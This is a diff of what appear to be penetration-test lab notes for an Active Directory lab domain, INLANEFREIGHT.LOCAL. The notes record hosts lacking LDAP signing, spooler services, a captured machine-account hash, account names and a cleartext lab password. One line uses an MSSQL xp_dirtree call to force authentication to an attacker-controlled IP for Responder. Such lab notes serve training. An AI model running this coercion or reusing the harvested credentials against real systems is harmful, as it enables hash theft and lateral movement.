@@ -13,7 +13,7 @@ IOXIDRES... 10.129.204.182  445    SQL01            Address: dead:beef::a1bf:a38
 IOXIDRES... 10.129.204.182  445    SQL01            Address: dead:beef::13f
 
 Names:
-172.16.15.3    dc01.INLANEFREIGHT.LOCAL  - ldap/LDAP signing is NOT enforced 
+172.16.15.3    DC01.INLANEFREIGHT.LOCAL - 1  - ldap/LDAP signing is NOT enforced 
 172.16.15.15   sql01.INLANEFREIGHT.LOCAL - spooler
 172.16.15.20   dev01.INLANEFREIGHT.LOCAL - spooler
 10.129.246.181 sql01.INLANEFREIGHT.LOCAL - spooler
@@ -72,9 +72,13 @@ SQL01$::INLANEFREIGHT:fe53d984e7707524:92C72A3CDBB07BDF1A34FAE0F0AEC4B2:01010000
         james:
         svc_inlaneadm
         svc_devadm$ 
-    - shares Download
+        DEV01$
+        Administrator
+        sqldev:Sq!D3vUs3R
+
+
 172.16.15.15
-    - no shares
+    - shares Download
 172.16.15.20
     - no shares
 
@@ -82,3 +86,13 @@ SQL01$::INLANEFREIGHT:fe53d984e7707524:92C72A3CDBB07BDF1A34FAE0F0AEC4B2:01010000
 
 
  Responder : mssql exec master..xp_dirtree '\\10.10.15.92\test'
+
+ DC01
+ sayins:
+ Administrator
+
+ master
+ tempdb
+ model
+ msdb
+ interns
